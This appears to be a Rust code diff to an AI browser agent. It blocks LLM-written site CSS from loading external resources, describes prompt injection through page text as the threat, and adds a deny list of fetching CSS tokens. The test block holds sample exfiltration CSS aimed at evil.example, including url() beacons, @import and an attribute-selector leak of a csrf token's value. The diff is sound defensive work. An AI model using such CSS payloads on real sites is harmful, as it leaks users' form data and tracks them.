@@ -1697,9 +1697,9 @@ impl AgentPlanner {
     /// Author a CSS "boost" for the current site from a natural-language request
     /// (BACKLOG #49) — e.g. "hide the cookie banner", "dark mode", "widen the
     /// article". Returns raw CSS (markdown fences / `<style>` wrappers stripped).
-    /// CSS only by design: it's injected into the page and CSS can't execute or
-    /// exfiltrate, so an LLM (potentially prompt-injected by page text) can't do
-    /// harm — unlike generated JS.
+    /// CSS only by design: it can't execute — unlike generated JS — and anything
+    /// that could load a resource is refused (see [`css_is_inert`]), so an LLM
+    /// prompt-injected by page text can't make a boost beacon or leak.
     pub fn author_css(&self, instruction: &str, page_text: &str) -> Result<String, AgentError> {
         const PAGE_BUDGET: usize = 6 * 1024;
         let prompt = format!(
@@ -1712,7 +1712,18 @@ impl AgentPlanner {
              \n\nPAGE:\n{}",
             wrap_untrusted(truncate_utf8(page_text, PAGE_BUDGET))
         );
-        Ok(strip_css(&self.backend.chat(&prompt)?))
+        let css = strip_css(&self.backend.chat(&prompt)?);
+        // The page text above is attacker-influenced, and this CSS is saved per
+        // host (and its subdomains) and re-injected on every visit. CSS *can*
+        // exfiltrate and track — `url()` beacons, attribute-selector leaks of
+        // input values, an `@import` the attacker keeps editing — so refuse
+        // anything that can load a resource rather than persist it.
+        if !css_is_inert(&css) {
+            return Err(AgentError::Policy(
+                "the generated CSS loads external resources; boosts may not",
+            ));
+        }
+        Ok(css)
     }
 }
 
@@ -1748,6 +1759,27 @@ fn strip_css(raw: &str) -> String {
         .replace("</style>", "")
         .trim()
         .to_string()
+}
+
+/// True when `css` cannot fetch anything: every CSS resource load goes through
+/// one of these function or at-rule tokens. Backslashes are refused outright,
+/// since CSS escapes (`\75 rl(`) would otherwise smuggle `url(` past the
+/// substring check, and a boost written for a page never needs them.
+fn css_is_inert(css: &str) -> bool {
+    let low = css.to_ascii_lowercase();
+    !css.contains('\\')
+        && ![
+            "url(",
+            "@import",
+            "image-set(",
+            "image(",
+            "src(",
+            "@font-face",
+            "expression(",
+            "-moz-binding",
+        ]
+        .iter()
+        .any(|t| low.contains(t))
 }
 
 /// Last-line policy gate, applied AFTER parsing — defense in depth even
@@ -2391,6 +2423,45 @@ mod tests {
             format: ExtractFormat::Csv,
         };
         assert_eq!(read.is_destructive(), None);
+    }
+
+    /// A boost is saved per host and re-injected on every visit, and the page
+    /// text steering its author is attacker-influenced: CSS that can fetch
+    /// (`@import`, `url()` beacons, attribute-selector leaks) is never saved.
+    #[test]
+    fn authored_css_that_can_fetch_is_refused() {
+        for evil in [
+            "@import url(https://evil.example/s.css);",
+            "@IMPORT 'https://evil.example/s.css';",
+            "input[name=csrf][value^=a]{background:URL(//evil.example/a)}",
+            "body{background:-webkit-image-set('//evil.example/a.png' 1x)}",
+            "a{cursor:image('//evil.example/c.png'),auto}",
+            "@font-face{font-family:x;src:local(Arial)}",
+            r"body{background:\75 rl(//evil.example/a)}",
+            "div{-moz-binding:none}",
+        ] {
+            assert!(!css_is_inert(evil), "would persist a fetch: {evil}");
+        }
+        for ok in [
+            "body{background:#111!important;color:#eee!important}",
+            ".cookie-banner,#ad-rail{display:none!important}",
+            "article{max-width:72ch;margin:0 auto}",
+        ] {
+            assert!(css_is_inert(ok), "ordinary boost refused: {ok}");
+        }
+
+        let p = AgentPlanner::new(Box::new(Canned(
+            "```css\n@import url(https://evil.example/s.css);\nbody{color:red}\n```",
+        )));
+        assert!(matches!(
+            p.author_css("dark mode", "page"),
+            Err(AgentError::Policy(_))
+        ));
+        let p = AgentPlanner::new(Box::new(Canned("<style>body{color:#eee}</style>")));
+        assert_eq!(
+            p.author_css("dark mode", "page").unwrap(),
+            "body{color:#eee}"
+        );
     }
 
     #[test]
